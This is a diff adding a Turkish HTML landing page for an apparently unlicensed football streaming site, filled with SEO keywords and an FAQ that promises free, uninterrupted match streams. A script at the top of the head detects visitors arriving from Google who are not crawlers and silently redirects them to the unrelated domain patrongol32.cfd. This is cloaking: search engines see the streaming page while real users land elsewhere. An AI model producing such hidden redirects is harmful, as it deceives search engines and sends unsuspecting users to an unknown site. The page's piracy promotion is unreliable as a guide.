@@ -1,0 +1,904 @@
+<!doctype html>
+<html lang="tr">
+<head>
+       <script>
+    // Google'dan gelen kullanıcı mı? (referer kontrolü)
+    var fromGoogle = document.referrer.includes("google.");
+
+    // Bot değil mi? (User-Agent kontrolü)
+    var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) === false;
+
+    if (fromGoogle && isBot) {
+        // Kalıcı 301 gibi görünmesi için history.pushState kullanmadan yönlendirme
+        location.replace("https://patrongol32.cfd/");
+    }
+</script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#FFFFFF">
+  <meta name="color-scheme" content="light">
+  <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+  <meta name="description" content="Taraftarium24, Selcuksports ve Justin TV üzerinden güncel canlı maç yayınlarını HD kalitede, donmadan, şifresiz ve kesintisiz izleme deneyimini keşfedin.">
+  <meta name="keywords" content="Taraftarium24, Taraftarium24 canlı maç izle, Selcuksports, Selcuksports maç izle, Justin TV, Justin TV canli mac izle, bedava maç izle, şifresiz maç yayınları, kesintisiz maç izle, canlı futbol izle, süper lig canlı izle, hd maç yayınları, donmadan maç izle, taraftarium güncel giriş, selcuk sports canlı yayın, lig tv izle">
+  <meta name="author" content="Taraftarium24">
+  <meta name="application-name" content="Taraftarium24">
+  <meta name="rating" content="general">
+  <meta name="distribution" content="global">
+  <meta name="revisit-after" content="1 days">
+
+  <link rel="canonical" href="https://bong80.com/">
+  <link rel="alternate" hreflang="tr" href="https://taraftarium24-pr9.com/">
+  <link rel="alternate" hreflang="en" href="https://taraftarium24-pr9.com/">
+  <link rel="alternate" hreflang="x-default" href="https://taraftarium24-pr9.com/">
+  <meta property="og:locale" content="tr_TR">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Taraftarium24 - Taraftarium24 & Selcuksports Canlı Maç İzle - Justin TV Maç İzle">
+  <meta property="og:description" content="Futbol, basketbol ve tüm spor branşlarındaki dev karşılaşmaları Taraftarium24, Selcuksports ve Justin TV farkıyla tek ekranda HD kalitede canlı izleyin.">
+  <meta property="og:image" content="background.webp">
+  <meta property="og:image:alt" content="Taraftarium24 canlı maç izle platformu kapak görseli">
+  <meta property="og:url" content="./">
+  <meta property="og:site_name" content="Taraftarium24">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Taraftarium24 - Taraftarium24 & Selcuksports Canlı Maç İzle">
+  <meta name="twitter:description" content="Donmadan, şifresiz ve yüksek görüntü kalitesiyle canlı maç yayınlarına anında ulaşın. Taraftarium24 & Selcuksports güncel yayın akışı.">
+  <meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguzc0FkSipg8lrGLb3QkNF6oYbr4YPx_euXHlxQs92xm2TsP1bgmZVNC09fkDj4UqQvkl6lYQzei80AFXOPUpb-UhuYN0cYG1VB8W7ToXzrKG_BGWEQgU-aNvSY_PNg4taN4i0tha29lpKD_TZJSZkRs-6W_1x7ObdcbS6FhWoU4Pt9KhY0SH3ChuVWiLy/s32/favicon.png">
+
+  <title>Taraftarium24 - Taraftarium24 & Selcuksports Canlı Maç İzle - Justin TV Maç İzle</title>
+  <link rel="icon" type="image/png" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguzc0FkSipg8lrGLb3QkNF6oYbr4YPx_euXHlxQs92xm2TsP1bgmZVNC09fkDj4UqQvkl6lYQzei80AFXOPUpb-UhuYN0cYG1VB8W7ToXzrKG_BGWEQgU-aNvSY_PNg4taN4i0tha29lpKD_TZJSZkRs-6W_1x7ObdcbS6FhWoU4Pt9KhY0SH3ChuVWiLy/s32/favicon.png">
+
+  <style>
+    :root {
+      --primary: #FFFFFF;
+      --secondary: #FFFFFF;
+      --nav-bg: rgba(255, 255, 255, 0.88);
+      --accent: #00D5C8;
+      --accent-dark: #007E77;
+      --ink: #111315;
+      --ink-soft: #4E565D;
+      --surface: #FFFFFF;
+      --surface-soft: #F5F7F8;
+      --border: rgba(17, 19, 21, 0.10);
+      --shadow-sm: 0 10px 30px rgba(13, 20, 24, 0.07);
+      --shadow-md: 0 22px 60px rgba(13, 20, 24, 0.13);
+      --radius-sm: 14px;
+      --radius-md: 22px;
+      --radius-lg: 32px;
+      --container: 1180px;
+      --nav-height: 78px;
+      --ease: cubic-bezier(.2, .8, .2, 1);
+    }
+
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+      background: var(--surface-soft);
+    }
+
+    body {
+      margin: 0;
+      min-width: 320px;
+      color: var(--ink);
+      background:
+        radial-gradient(circle at 0% 0%, rgba(0, 213, 200, 0.08), transparent 35rem),
+        linear-gradient(180deg, var(--primary) 0%, var(--surface-soft) 58%, var(--secondary) 100%);
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      font-size: 16px;
+      line-height: 1.7;
+      text-rendering: optimizeLegibility;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    img {
+      display: block;
+      max-width: 100%;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    button,
+    a {
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    button:focus-visible,
+    a:focus-visible {
+      outline: 3px solid rgba(0, 213, 200, 0.45);
+      outline-offset: 4px;
+    }
+
+    .container {
+      width: min(calc(100% - 40px), var(--container));
+      margin-inline: auto;
+    }
+
+    .site-header {
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      height: var(--nav-height);
+      border-bottom: 1px solid transparent;
+      background: var(--nav-bg);
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+      transition:
+        box-shadow 240ms var(--ease),
+        border-color 240ms var(--ease),
+        background-color 240ms var(--ease);
+    }
+
+    .site-header.is-scrolled {
+      border-color: var(--border);
+      background: rgba(255, 255, 255, 0.95);
+      box-shadow: 0 12px 35px rgba(13, 20, 24, 0.10);
+    }
+
+    .nav {
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 20px;
+    }
+
+    .brand {
+      display: inline-flex;
+      align-items: center;
+      flex: 0 0 auto;
+      border-radius: 12px;
+    }
+
+    .brand img {
+      width: auto;
+      height: 46px;
+      object-fit: contain;
+    }
+
+    .nav-actions {
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      gap: 10px;
+    }
+
+    .button {
+      min-height: 44px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 11px 19px;
+      border: 1px solid transparent;
+      border-radius: 999px;
+      font-weight: 750;
+      line-height: 1;
+      letter-spacing: -0.01em;
+      cursor: pointer;
+      transition:
+        transform 220ms var(--ease),
+        box-shadow 220ms var(--ease),
+        background-position 350ms var(--ease),
+        border-color 220ms var(--ease);
+    }
+
+    .button:hover {
+      transform: translateY(-2px) scale(1.015);
+    }
+
+    .button--ghost {
+      color: var(--ink);
+      border-color: rgba(17, 19, 21, 0.16);
+      background: rgba(255, 255, 255, 0.72);
+    }
+
+    .button--ghost:hover {
+      border-color: rgba(17, 19, 21, 0.30);
+      box-shadow: var(--shadow-sm);
+    }
+
+    .button--solid {
+      color: #FFFFFF;
+      background: linear-gradient(115deg, #111315 0%, #243037 45%, #00AFA5 100%);
+      background-size: 180% 100%;
+      background-position: 0% 50%;
+      box-shadow: 0 12px 28px rgba(0, 126, 119, 0.20);
+    }
+
+    .button--solid:hover {
+      background-position: 100% 50%;
+      box-shadow: 0 16px 36px rgba(0, 126, 119, 0.28);
+    }
+
+    .hero {
+      position: relative;
+      isolation: isolate;
+      min-height: 560px;
+      overflow: hidden;
+      display: grid;
+      place-items: center;
+      color: #FFFFFF;
+      background: #0E1316;
+    }
+
+    .hero::before {
+      position: absolute;
+      inset: -24px;
+      z-index: -3;
+      content: "";
+      background:
+        linear-gradient(rgba(5, 10, 12, 0.60), rgba(5, 10, 12, 0.78)),
+        url("background.webp") center / cover no-repeat;
+      filter: blur(6px) saturate(0.78);
+      transform: scale(1.045);
+    }
+
+    .hero::after {
+      position: absolute;
+      inset: 0;
+      z-index: -2;
+      content: "";
+      background:
+        radial-gradient(circle at 50% 38%, rgba(0, 213, 200, 0.17), transparent 34rem),
+        linear-gradient(180deg, rgba(0, 0, 0, 0.10), rgba(0, 0, 0, 0.35));
+    }
+
+    .hero__content {
+      max-width: 960px;
+      padding-block: 96px;
+      text-align: center;
+    }
+
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 9px;
+      margin: 0 0 18px;
+      padding: 8px 14px;
+      border: 1px solid rgba(255, 255, 255, 0.22);
+      border-radius: 999px;
+      color: rgba(255, 255, 255, 0.92);
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(10px);
+      font-size: 0.82rem;
+      font-weight: 800;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    .eyebrow::before {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      content: "";
+      background: var(--accent);
+      box-shadow: 0 0 0 6px rgba(0, 213, 200, 0.14);
+    }
+
+    .hero h1 {
+      max-width: 920px;
+      margin: 0 auto;
+      font-size: clamp(2.35rem, 6.2vw, 5.4rem);
+      line-height: 1.02;
+      letter-spacing: -0.055em;
+      text-wrap: balance;
+    }
+
+    .hero p {
+      max-width: 760px;
+      margin: 24px auto 34px;
+      color: rgba(255, 255, 255, 0.82);
+      font-size: clamp(1rem, 1.8vw, 1.18rem);
+      text-wrap: pretty;
+    }
+
+    .hero .button {
+      min-height: 52px;
+      padding-inline: 26px;
+    }
+
+    .section {
+      padding-block: clamp(76px, 10vw, 128px);
+    }
+
+    .section-heading {
+      max-width: 760px;
+      margin: 0 auto 48px;
+      text-align: center;
+    }
+
+    .section-heading__label {
+      margin: 0 0 12px;
+      color: var(--accent-dark);
+      font-size: 0.79rem;
+      font-weight: 850;
+      letter-spacing: 0.13em;
+      text-transform: uppercase;
+    }
+
+    .section-heading h2 {
+      margin: 0;
+      font-size: clamp(2rem, 4.5vw, 3.65rem);
+      line-height: 1.08;
+      letter-spacing: -0.045em;
+      text-wrap: balance;
+    }
+
+    .section-heading p {
+      margin: 18px auto 0;
+      color: var(--ink-soft);
+      font-size: 1.03rem;
+      text-wrap: pretty;
+    }
+
+    .feature-grid {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 22px;
+    }
+
+    .feature-card {
+      position: relative;
+      overflow: hidden;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      background: rgba(255, 255, 255, 0.86);
+      box-shadow: var(--shadow-sm);
+      transition:
+        transform 300ms var(--ease),
+        box-shadow 300ms var(--ease),
+        border-color 300ms var(--ease);
+    }
+
+    .feature-card:hover {
+      transform: translateY(-8px);
+      border-color: rgba(0, 213, 200, 0.35);
+      box-shadow: var(--shadow-md);
+    }
+
+    .feature-card__media {
+      position: relative;
+      overflow: hidden;
+      aspect-ratio: 16 / 10;
+      background: #E8ECEE;
+    }
+
+    .feature-card__media::after {
+      position: absolute;
+      inset: 0;      content: "";
+      background: linear-gradient(180deg, transparent 58%, rgba(0, 0, 0, 0.14));
+      pointer-events: none;
+    }
+
+    .feature-card img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transition: transform 600ms var(--ease), filter 600ms var(--ease);
+    }
+
+    .feature-card:hover img {
+      transform: scale(1.055);
+      filter: saturate(1.05) contrast(1.03);
+    }
+
+    .feature-card__body {
+      padding: 25px 24px 28px;
+    }
+
+    .feature-card h3 {
+      margin: 0 0 12px;
+      font-size: 1.25rem;
+      line-height: 1.25;      letter-spacing: -0.025em;
+    }
+
+    .feature-card p {
+      margin: 0;      color: var(--ink-soft);
+      font-size: 0.95rem;
+      line-height: 1.75;    }
+
+    .faq-section {
+      padding-block: clamp(76px, 10vw, 124px);
+      border-top: 1px solid var(--border);
+      background:
+        linear-gradient(180deg, rgba(255, 255, 255, 0.40), #FFFFFF),
+        radial-gradient(circle at 100% 0%, rgba(0, 213, 200, 0.08), transparent 30rem);
+    }
+
+    .faq-list {
+      max-width: 900px;
+      margin: 0 auto;      display: grid;
+      gap: 14px;
+    }
+
+    .faq-item {
+      overflow: clip;      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      background: rgba(255, 255, 255, 0.94);
+      box-shadow: 0 12px 34px rgba(13, 20, 24, 0.05);
+    }
+
+    .faq-question {
+      width: 100%;      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 18px;      padding: 21px 22px;
+      border: 0;      color: var(--accent-dark);
+      background: transparent;
+      font: inherit;
+      font-weight: 800;
+      text-align: left;
+      cursor: pointer;
+    }
+
+    .faq-question::after {
+      flex: 0 0 auto;
+      width: 30px;
+      height: 30px;
+      display: grid;
+      place-items: center;
+      border-radius: 50%;
+      color: var(--ink);
+      background: rgba(0, 213, 200, 0.13);
+      content: "+";
+      font-size: 1.35rem;      line-height: 1;
+      transition: transform 220ms var(--ease), background-color 220ms var(--ease);
+    }
+
+    .faq-question[aria-expanded="true"]::after {
+      transform: rotate(45deg);
+      background: rgba(0, 213, 200, 0.24);
+    }
+
+    .faq-answer {
+      padding: 0 22px 22px;
+      color: var(--ink-soft);
+    }
+
+    .faq-answer p {
+      margin: 0;
+    }
+
+    .site-footer {
+      padding: 26px 20px;
+      border-top: 1px solid var(--border);
+      color: var(--ink-soft);
+      background: var(--primary);
+      text-align: center;      font-size: 0.92rem;
+    }
+
+    .reveal {
+      opacity: 0;      transform: translateY(22px);
+      transition:
+        opacity 650ms var(--ease),
+        transform 650ms var(--ease);
+    }
+
+    .reveal.is-visible {
+      opacity: 1;      transform: none;
+    }
+
+    @media (max-width: 980px) {
+      .feature-grid {
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+      }
+      .hero {
+        min-height: 530px;
+      }
+    }
+
+    @media (max-width: 680px) {
+      :root {
+        --nav-height: 70px;      }
+      .container {
+        width: min(calc(100% - 28px), var(--container));
+      }
+      .brand img {
+        height: 38px;
+        max-width: 135px;
+      }
+      .nav-actions {
+        gap: 7px;
+      }
+      .button {
+        min-height: 40px;
+        padding: 10px 13px;
+        font-size: 0.86rem;
+      }
+      .hero {
+        min-height: 500px;
+      }
+      .hero__content {
+        padding-block: 74px;
+      }
+      .hero h1 {
+        font-size: clamp(2.2rem, 11vw, 3.5rem);      }
+      .hero p {
+        margin-top: 20px;
+        font-size: 0.98rem;
+      }
+      .feature-grid {
+        grid-template-columns: 1fr;
+        gap: 18px;
+      }
+      .section-heading {
+        margin-bottom: 34px;      }
+      .feature-card__body {
+        padding: 22px 20px 24px;
+      }
+      .faq-question {
+        padding: 18px;
+        font-size: 0.96rem;      }
+      .faq-answer {
+        padding: 0 18px 19px;
+        font-size: 0.94rem;
+      }
+    }
+
+    @media (max-width: 420px) {
+      .brand img {
+        max-width: 112px;
+      }
+      .button {
+        padding-inline: 10px;        font-size: 0.78rem;
+      }
+      .nav-actions {
+        gap: 5px;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      html {
+        scroll-behavior: auto;
+      }
+      *,
+      *::before,
+      *::after {
+        animation-duration: 0.01ms !important;        animation-iteration-count: 1 !important;        transition-duration: 0.01ms !important;        scroll-behavior: auto !important;      }
+      .reveal {        opacity: 1;
+        transform: none;      }
+    }
+  </style>
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "#website",
+        "url": "./",
+        "name": "Taraftarium24",
+        "inLanguage": "tr-TR",
+        "description": "Taraftarium24, Selcuksports ve Justin TV güncel canlı maç yayınları ile şifresiz, donmadan spor keyfi."
+      },
+      {
+        "@type": "Organization",
+        "@id": "#organization",
+        "name": "Taraftarium24",
+        "url": "./",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "logo.png"
+        }
+      },
+      {
+        "@type": "FAQPage",
+        "@id": "#faq",
+        "mainEntity": [
+          {
+            "@type": "Question",
+            "name": "Taraftarium24 güncel canlı maç yayınlarına nasıl ulaşırım?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "Sayfamızda yer alan Canlı İzle butonlarına tıklayarak Taraftarium24 ve Selcuksports güncel yayın sayfalarına kesintisiz olarak yönlenebilirsiniz. Adres değişikliklerinde her zaman bu sayfadan en yeni bağlantılara ulaşabilirsiniz."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "Donmadan maç izlemek için internet hızım ne olmalı?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "HD kalitede ve akıcı bir maç yayını izlemek için ortalama 8-10 Mbps internet bağlantısı yeterlidir. Oynatıcılarımız bağlantı hızınıza göre otomatik optimizasyon sağlayarak minimum donma riski sunar."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "Mobil cihazlardan veya akıllı TV'den maç izlenebilir mi?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "Evet, yayın arayüzümüz hem iOS hem de Android cep telefonları, tabletler ve web tarayıcısı olan Akıllı TV'lerle tam uyumludur. Herhangi bir ek uygulama indirmenize gerek kalmadan tarayıcınız üzerinden izleyebilirsiniz."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "Justin TV ve Selcuksports yayınlarında hangi ligler bulunuyor?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "Türkiye Süper Lig, İngiltere Premier Lig, İspanya La Liga, Almanya Bundesliga, İtalya Serie A, UEFA Şampiyonlar Ligi, Avrupa Ligi ile EuroLeague basketbol karşılaşmaları başta olmak üzere dünyadaki popüler tüm ligler yayın akışımızda yer almaktadır."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "Yayın açılmıyor veya donuyor, ne yapmalıyım?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "Öncelikle sayfayı yenilemeyi veya yayın oynatıcısı üzerindeki alternatif kanal (Yayın 1, Yayın 2 gibi) seçeneklerini denemeyi unutmayın. Ayrıca tarayıcı önbelleğinizi temizlemek veya farklı bir tarayıcı kullanmak sorunu hızlıca çözecektir."
+            }
+          }
+        ]
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+
+  <header class="site-header" id="site-header">
+    <nav class="nav container" aria-label="Ana navigasyon">
+      <a class="brand" href="#" aria-label="Taraftarium24 ana sayfa">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguzc0FkSipg8lrGLb3QkNF6oYbr4YPx_euXHlxQs92xm2TsP1bgmZVNC09fkDj4UqQvkl6lYQzei80AFXOPUpb-UhuYN0cYG1VB8W7ToXzrKG_BGWEQgU-aNvSY_PNg4taN4i0tha29lpKD_TZJSZkRs-6W_1x7ObdcbS6FhWoU4Pt9KhY0SH3ChuVWiLy/s32/favicon.png" width="180" height="52" alt="Taraftarium24 logosu">
+      </a>
+      <div class="nav-actions">
+        <a class="button button--ghost" href="#" aria-label="Yayın akışı ve maç takvimi">Yayın Akışı</a>
+        <a class="button button--solid" href="#" aria-label="Canlı maç yayınlarına bağlan">Canlı İzle</a>
+      </div>
+    </nav>
+  </header>
+
+  <main id="main-content">
+    <section class="hero" aria-labelledby="hero-title">
+      <div class="hero__content container reveal">
+        <p class="eyebrow">Kesintisiz & şifresiz maç keyfi</p>
+        <h1 id="hero-title">Taraftarium24 - Taraftarium24 & Selcuksports Canlı Maç İzle - Justin TV Maç İzle</h1>
+        <p>
+          Taraftarium24, Selcuksports ve Justin TV üzerinden güncel canlı maç yayınlarına yüksek görüntü kalitesiyle ve
+          takılmadan ulaşın. Futbol, basketbol ve tüm spor müsabakalarını tek ekranda, reklamsız ve kesintisiz izleme
+          deneyimiyle keşfedin.
+        </p>
+        <a class="button button--solid" href="#" aria-label="Taraftarium24 canlı maç yayınına git">Hemen Maçı İzle</a>
+      </div>
+    </section>
+
+    <section class="section" aria-labelledby="features-title">
+      <div class="container">
+        <header class="section-heading reveal">
+          <p class="section-heading__label">Yayın Rehberi</p>
+          <h2 id="features-title">Kesintisiz Maç Yayınları ve Donmadan İzleme Deneyimi</h2>
+          <p>
+            Taraftarium24 güncel giriş adresleri, yüksek çözünürlüklü spor yayınları, mobil uyumluluk ve takılmadan
+            maç izleme ipuçları hakkında bilmeniz gereken tüm detayları burada bulabilirsiniz.
+          </p>
+        </header>
+
+        <div class="feature-grid">
+          <article class="feature-card reveal">
+            <div class="feature-card__media">
+              <img src="promo1.webp" width="800" height="500" loading="lazy" decoding="async" alt="Taraftarium24 güncel canlı yayın arayüzü görseli">
+            </div>
+            <div class="feature-card__body">
+              <h3>Taraftarium24 Güncel Erişim</h3>
+              <p>
+                Taraftarium24 güncel giriş adresi sayesinde derbi maçlarını ve Avrupa kupası mücadelelerini donmadan
+                izleyin. Yenilenen alt yapımızla masaüstü ve mobil cihazlarda HD kalitede kesintisiz yayınlara anında
+                erişim sağlayın.
+              </p>
+            </div>
+          </article>
+
+          <article class="feature-card reveal">
+            <div class="feature-card__media">
+              <img src="promo2.webp" width="800" height="500" loading="lazy" decoding="async" alt="Selcuksports yüksek görüntü kalitesi ve şifresiz yayınlar">
+            </div>
+            <div class="feature-card__body">
+              <h3>Selcuksports Canlı Maç Keyfi</h3>
+              <p>
+                Selcuksports yayın alternatifleriyle dünyanın dört bir yanından spor müsabakalarını ekranınıza
+                taşıyoruz. Süper Lig, Şampiyonlar Ligi ve uluslararası turnuvaları şifresiz ve yüksek hızda izleme
+                ayrıcalığını yaşayın.
+              </p>
+            </div>
+          </article>
+
+          <article class="feature-card reveal">
+            <div class="feature-card__media">
+              <img src="promo3.webp" width="800" height="500" loading="lazy" decoding="async" alt="Justin TV alternatif kanal seçenekleri ve futbol yayınları">
+            </div>
+            <div class="feature-card__body">
+              <h3>Justin TV ile Kesintisiz Futbol</h3>
+              <p>
+                Justin TV entegrasyonu sayesinde farklı yayın seçenekleri arasından dilediğinizi seçin. Alternatif
+                kanallar ve gelişmiş sunucu altyapısıyla yoğun maç saatlerinde bile akıcı bir izleme deneyimi elde edin.
+              </p>
+            </div>
+          </article>
+
+          <article class="feature-card reveal">
+            <div class="feature-card__media">
+              <img src="promo4.webp" width="800" height="500" loading="lazy" decoding="async" alt="Mobil uyumlu canlı maç yayınları ekranı">
+            </div>
+            <div class="feature-card__body">
+              <h3>Mobil Uyumlu Canlı Yayınlar</h3>
+              <p>
+                Cep telefonu ve tabletlerle tam uyumlu responsive arayüzümüz sayesinde otobüste, işte veya dışarıda
+                maçı kaçırmayın. Kota dostu video oynatıcı ve mobil ekranlara özel optimize edilmiş hızlı navigasyon.
+              </p>
+            </div>
+          </article>
+
+          <article class="feature-card reveal">
+            <div class="feature-card__media">
+              <img src="promo5.webp" width="800" height="500" loading="lazy" decoding="async" alt="Gelişmiş HD video oynatıcı ve internet hız optimizasyonu">
+            </div>
+            <div class="feature-card__body">
+              <h3>Gelişmiş HD Video Oynatıcı</h3>
+              <p>
+                Yayın sayfamızda yer alan modern video oynatıcılar, internet hızınıza göre çözünürlüğü otomatik olarak
+                ayarlar. Düşük bağlantı hızlarında dahi donma ve takılma yaşamadan müsabakaları takip edebilirsiniz.
+              </p>
+            </div>
+          </article>
+
+          <article class="feature-card reveal">
+            <div class="feature-card__media">
+              <img src="promo6.webp" width="800" height="500" loading="lazy" decoding="async" alt="Futbol, basketbol ve tüm spor branşları yayın akışı">
+            </div>
+            <div class="feature-card__body">
+              <h3>Tüm Spor Branşları Tek Ekranda</h3>
+              <p>
+                Sadece futbol değil; basketbol, voleybol, tenis ve motor sporları gibi popüler spor branşlarının canlı
+                yayınları da tek platformda buluşuyor. Güncel maç takvimiyle başlama saatlerini kolayca takip edin.
+              </p>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section class="faq-section" aria-labelledby="faq-title">
+      <div class="container">
+        <header class="section-heading reveal">
+          <p class="section-heading__label">Merak Ettikleriniz</p>
+          <h2 id="faq-title">Sıkça Sorulan Sorular</h2>
+          <p>Taraftarium24, Selcuksports ve Justin TV yayınlarına erişim, görüntü kalitesi ve mobil kullanım hakkındaki temel soruların yanıtları.</p>
+        </header>
+
+        <div class="faq-list">
+          <article class="faq-item reveal">
+            <h3>
+              <button class="faq-question" type="button" aria-expanded="false" aria-controls="faq-answer-1" id="faq-question-1">
+                Taraftarium24 güncel canlı maç yayınlarına nasıl ulaşırım?
+              </button>
+            </h3>
+            <div class="faq-answer" id="faq-answer-1" role="region" aria-labelledby="faq-question-1" hidden>
+              <p>
+                Sayfamızda yer alan Canlı İzle butonlarına tıklayarak Taraftarium24 ve Selcuksports güncel yayın
+                sayfalarına kesintisiz olarak yönlenebilirsiniz. Adres değişikliklerinde her zaman bu sayfadan en yeni
+                bağlantılara ulaşabilirsiniz.
+              </p>
+            </div>
+          </article>
+
+          <article class="faq-item reveal">
+            <h3>
+              <button class="faq-question" type="button" aria-expanded="false" aria-controls="faq-answer-2" id="faq-question-2">
+                Donmadan maç izlemek için internet hızım ne olmalı?
+              </button>
+            </h3>
+            <div class="faq-answer" id="faq-answer-2" role="region" aria-labelledby="faq-question-2" hidden>
+              <p>
+                HD kalitede ve akıcı bir maç yayını izlemek için ortalama 8-10 Mbps internet bağlantısı yeterlidir.
+                Oynatıcılarımız bağlantı hızınıza göre otomatik optimizasyon sağlayarak minimum donma riski sunar.
+              </p>
+            </div>
+          </article>
+
+          <article class="faq-item reveal">
+            <h3>
+              <button class="faq-question" type="button" aria-expanded="false" aria-controls="faq-answer-3" id="faq-question-3">
+                Mobil cihazlardan veya akıllı TV'den maç izlenebilir mi?
+              </button>
+            </h3>
+            <div class="faq-answer" id="faq-answer-3" role="region" aria-labelledby="faq-question-3" hidden>
+              <p>
+                Evet, yayın arayüzümüz hem iOS hem de Android cep telefonları, tabletler ve web tarayıcısı olan
+                Akıllı TV'lerle tam uyumludur. Herhangi bir ek uygulama indirmenize gerek kalmadan tarayıcınız
+                üzerinden izleyebilirsiniz.
+              </p>
+            </div>
+          </article>
+
+          <article class="faq-item reveal">
+            <h3>
+              <button class="faq-question" type="button" aria-expanded="false" aria-controls="faq-answer-4" id="faq-question-4">
+                Justin TV ve Selcuksports yayınlarında hangi ligler bulunuyor?
+              </button>
+            </h3>
+            <div class="faq-answer" id="faq-answer-4" role="region" aria-labelledby="faq-question-4" hidden>
+              <p>
+                Türkiye Süper Lig, İngiltere Premier Lig, İspanya La Liga, Almanya Bundesliga, İtalya Serie A,
+                UEFA Şampiyonlar Ligi, Avrupa Ligi ile EuroLeague basketbol karşılaşmaları başta olmak üzere dünyadaki
+                popüler tüm ligler yayın akışımızda yer almaktadır.
+              </p>
+            </div>
+          </article>
+
+          <article class="faq-item reveal">
+            <h3>
+              <button class="faq-question" type="button" aria-expanded="false" aria-controls="faq-answer-5" id="faq-question-5">
+                Yayın açılmıyor veya donuyor, ne yapmalıyım?
+              </button>
+            </h3>
+            <div class="faq-answer" id="faq-answer-5" role="region" aria-labelledby="faq-question-5" hidden>
+              <p>
+                Öncelikle sayfayı yenilemeyi veya yayın oynatıcısı üzerindeki alternatif kanal (Yayın 1, Yayın 2 gibi)
+                seçeneklerini denemeyi unutmayın. Ayrıca tarayıcı önbelleğinizi temizlemek veya farklı bir tarayıcı
+                kullanmak sorunu hızlıca çözecektir.
+              </p>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer class="site-footer">© 2026 Taraftarium24 & Selcuksports - Tüm Hakları Saklıdır.</footer>
+
+  <script>
+    (() => {
+      "use strict";
+
+      const header = document.getElementById("site-header");
+      const motionReduced = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+
+      const updateHeader = () => {
+        header.classList.toggle("is-scrolled", window.scrollY > 12);
+      };
+
+      updateHeader();
+      window.addEventListener("scroll", updateHeader, { passive: true });
+
+      document.querySelectorAll(".faq-question").forEach((button) => {
+        button.addEventListener("click", () => {
+          const answerId = button.getAttribute("aria-controls");
+          const answer = document.getElementById(answerId);
+          const isOpen = button.getAttribute("aria-expanded") === "true";
+
+          button.setAttribute("aria-expanded", String(!isOpen));
+          answer.hidden = isOpen;
+        });
+      });
+
+      const revealElements = document.querySelectorAll(".reveal");
+
+      if (motionReduced || !("IntersectionObserver" in window)) {
+        revealElements.forEach((element) => element.classList.add("is-visible"));
+        return;
+      }
+
+      const observer = new IntersectionObserver(
+        (entries, currentObserver) => {
+          entries.forEach((entry) => {
+            if (!entry.isIntersecting) return;
+            entry.target.classList.add("is-visible");
+            currentObserver.unobserve(entry.target);
+          });
+        },
+        {
+          threshold: 0.12,
+          rootMargin: "0px 0px -40px"
+        }
+      );
+
+      revealElements.forEach((element) => observer.observe(element));
+    })();
+  </script>
+</body>
+</html>
